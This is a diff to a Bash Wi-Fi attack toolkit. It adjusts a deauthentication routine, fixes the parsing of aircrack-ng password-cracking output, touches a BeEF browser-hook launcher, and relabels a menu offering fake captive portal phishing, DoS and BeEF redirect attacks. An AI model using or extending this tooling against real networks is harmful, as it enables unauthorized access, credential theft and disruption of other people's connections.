@@ -315,6 +315,7 @@ check_band_available() {
 Deauther(){
 
     TIMEOUT="$1"
+    iwconfig $MON_INTERFACE channel $CHANNEL_VAR
 
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
         # Estamos en un entorno gráfico
@@ -349,11 +350,11 @@ Craking_handshake(){
     if aircrack-ng $FILE -w $WORDLIST > result_"$ESSID_VAR".txt ;then
 
         
-        echo "We cracked the password. Saved on ./data_collected/network_dump/result_ESSID.txt"
+        echo "We cracked the password. Saved on ./data_collected/network_dump/result_$ESSID_VAR.txt"
         RESULTS=$(grep "KEY FOUND!" result_"$ESSID_VAR".txt | tr -d '[:space:]')
         echo "$RESULTS"
         
-        =$(grep "KEY FOUND!" ./data_collected/network_dump/result_succesful_example.txt | sed -E 's/.*\[ (.+) \].*/\1/' | head -n 1)
+        RESULTS=$(grep "KEY FOUND!" "./data_collected/network_dump/result_$ESSID_VAR.txt" | sed -E 's/.*\[ (.+) \].*/\1/' | head -n 1)
 
 
         rm ./wificapture-01.*
@@ -528,7 +529,7 @@ beef_local() {
     html_hook & 
 
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-        firefox --browser   --new-window $IP_HOOK:3000/ui/panel
+        firefox --browser --new-window $IP_HOOK:3000/ui/panel
     else
         echo "You are not on graphic terminal we can't open beef panel"
     fi
@@ -559,7 +560,7 @@ beef_menu() {
 
 menu(){
    
-    if true; then #./install.sh
+    if ./install.sh; then #true
         select_interface
         clear
     else
@@ -642,7 +643,7 @@ menu(){
         echo "Atacks Menu"
         echo "- - - - - - - - - - - - - - - - - -"
         echo "5. Deauther + Bruteforce (Get inside the Wireless network) "
-        echo "6. Fake Capcha (Deauther + Ap Spofing + Phishing Login)"
+        echo "6. Fake Captive Portal (Deauther + Ap Spofing + Phishing Login)"
         echo "7. DoS Attack (Stop the wireless conexions)"
         echo "8. Scan Network (Search Devices + Vulnerabilities)"
         echo "9. BEeF redirect attack"
